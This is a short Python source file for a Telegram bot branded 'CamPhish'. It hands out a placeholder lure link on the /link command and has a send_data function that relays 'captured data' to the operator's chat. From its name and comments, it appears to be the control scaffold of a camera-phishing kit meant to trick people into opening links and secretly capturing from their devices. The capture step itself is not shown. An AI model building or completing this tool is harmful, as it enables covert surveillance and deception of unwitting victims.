import telebot
import os
import requests
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Get bot token and chat ID from environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# Create a new TeleBot instance
bot = telebot.TeleBot(BOT_TOKEN)

# Handler for the /start and /help commands
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Hi! I'm your CamPhish bot. Send /link to generate a new link.")

# Handler for the /link command
@bot.message_handler(commands=['link'])
def send_link(message):
    # For now, we'll just send a placeholder link.
    # We will replace this with the actual link generation later.
    link = "YOUR_RENDER_URL"  # Replace with your Render app's URL
    bot.reply_to(message, f"Here is your new link: {link}")

# Function to send captured data to the user
def send_data(data):
    bot.send_message(CHAT_ID, data)

# Start the bot
if __name__ == "__main__":
    if BOT_TOKEN and CHAT_ID:
        print("Bot is running...")
        bot.polling()
    else:
        print("Bot token and chat ID are not set. Please set the BOT_TOKEN and CHAT_ID environment variables.")
